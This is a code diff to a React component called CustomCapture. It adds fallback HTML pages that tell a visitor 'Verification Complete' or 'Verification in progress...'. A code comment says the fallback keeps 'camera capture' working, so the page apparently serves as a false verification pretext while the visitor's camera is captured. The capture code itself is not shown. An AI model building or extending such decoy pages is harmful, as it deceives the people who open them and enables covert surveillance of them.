@@ -26,10 +26,37 @@ const CustomCapture = () => {
           const settings = data.setting_value as { customCaptureHtml?: string };
           if (settings.customCaptureHtml) {
             setCustomHtml(settings.customCaptureHtml);
+            return;
           }
         }
+        
+        // Fallback: If no custom HTML found, use a default capture page
+        const defaultHtml = `
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Verification</title>
+            <style>
+              body { font-family: Arial, sans-serif; background: #1a1a2e; color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+              .container { text-align: center; padding: 20px; }
+              h1 { color: #00ff88; }
+              p { color: #888; }
+            </style>
+          </head>
+          <body>
+            <div class="container">
+              <h1>✓ Verification Complete</h1>
+              <p>Thank you for verifying. You may close this page.</p>
+            </div>
+          </body>
+          </html>
+        `;
+        setCustomHtml(defaultHtml);
       } catch (err) {
         console.error('Error loading custom HTML:', err);
+        // On error, still set a fallback HTML so camera capture works
+        setCustomHtml('<div style="display:flex;align-items:center;justify-content:center;min-height:100vh;background:#1a1a2e;color:#00ff88;font-family:Arial;">Verification in progress...</div>');
       }
     };
 
